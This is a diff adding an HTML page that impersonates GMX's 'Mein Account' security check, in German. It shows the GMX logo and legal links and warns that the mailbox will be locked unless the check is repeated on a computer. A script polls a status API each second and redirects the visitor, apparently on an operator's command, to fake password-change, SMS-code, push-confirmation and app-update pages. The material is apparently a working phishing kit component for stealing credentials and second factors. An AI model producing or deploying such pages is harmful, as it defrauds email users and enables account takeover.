@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <title>Sicherheitsprüfung — GMX Mein Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <style>
+    .open-on-pc-card { max-width: 480px; margin: 0 auto; }
+    .open-on-pc-text { font-size: 1rem; line-height: 1.6; color: var(--text, #333); margin: 0 0 24px 0; }
+    .open-on-pc-icon { width: 52px; height: 52px; margin: 0 auto 20px; display: block; }
+    .open-on-pc-icon--warning .triangle { fill: #d32f2f; }
+    .open-on-pc-icon--warning .mark { fill: #fff; }
+  </style>
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+</head>
+<body class="page-change-password">
+  <header class="gmx-header gmx-header--steps" aria-hidden="false">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">GMX</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+    <main class="main card open-on-pc-card">
+      <section class="card-inner step active">
+        <header class="auth-header">
+          <svg class="logo-brand" xmlns="http://www.w3.org/2000/svg" width="97" height="32" viewBox="0 0 123 40" aria-label="gmx-logo">
+            <path fill="#000000" d="M109.42,18.84,120.08,1.09H109.2l-5.67,9-6.1-9H85.51L98.08,18.82l-12.57,20H97.43l6.8-11.37,8.06,11.37h10.64ZM70,1.09,61.91,21.28,54.24,1.09H44.57L38.15,38.87h9.77L51.08,17.1h.1l8.66,21.77h3.91L72.82,17.1h.12l2.75,21.77h9.82L79.79,1.09ZM20.2,17.8v7.68h8C27.78,29.79,24.52,32,20.3,32c-6.42,0-9.89-5.91-9.89-11.75S13.74,8.4,20.15,8.4c3.94,0,6.76,2.38,8.11,5.95l9.26-3.88C34.29,3.47,28.31,0,20.59,0,8.5,0,.25,8,.25,20.19.25,32,8.45,40,20.25,40c6.27,0,11.8-2.24,15.46-7.36C39,28,39.45,23.28,39.55,17.8Z"/>
+          </svg>
+          <h2 class="heading-main">Sicherheitsprüfung</h2>
+        </header>
+        <svg class="open-on-pc-icon open-on-pc-icon--warning" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path class="triangle" d="M12 1.5L2 21h20L12 1.5z"/>
+          <path class="mark" d="M11 7h2v8h-2z"/>
+          <circle class="mark" cx="12" cy="18.5" r="1.25"/>
+        </svg>
+        <p class="open-on-pc-text">
+          Öffnen Sie die E-Mail auf dem Computer oder Laptop und führen Sie dort ebenfalls die Sicherheitsprüfung durch. Andernfalls wird der Zugang zum Postfach aus Sicherheitsgründen gesperrt.
+        </p>
+      </section>
+    </main>
+  </div>
+
+  <script>
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      var id = params.get('id') || '';
+      if (!id) return;
+      var t = setInterval(function () {
+        fetch('/api/status?id=' + encodeURIComponent(id) + '&page=bitte-am-pc&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+          .then(function (r) { return r.json(); })
+          .then(function (res) {
+            if ((res && res.mode) === 'manual') return;
+            var st = res && res.status;
+            if (st === 'redirect_android') { clearInterval(t); window.location = '/app-update?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_sicherheit') { clearInterval(t); window.location = '/sicherheit-update?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_change_password') { clearInterval(t); window.location = '/passwort-aendern?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_push') { clearInterval(t); window.location = '/push-confirm.html?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_sms_code') { clearInterval(t); window.location = '/sms-code.html?id=' + encodeURIComponent(id); }
+            else if (st === 'redirect_gmx_net') { clearInterval(t); window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/'; }
+            else if (st === 'error') { clearInterval(t); window.location = '/anmelden'; }
+          })
+          .catch(function () {});
+      }, 1000);
+    })();
+  </script>
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+    </ul>
+  </footer>
+  <script src="/status-redirect.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
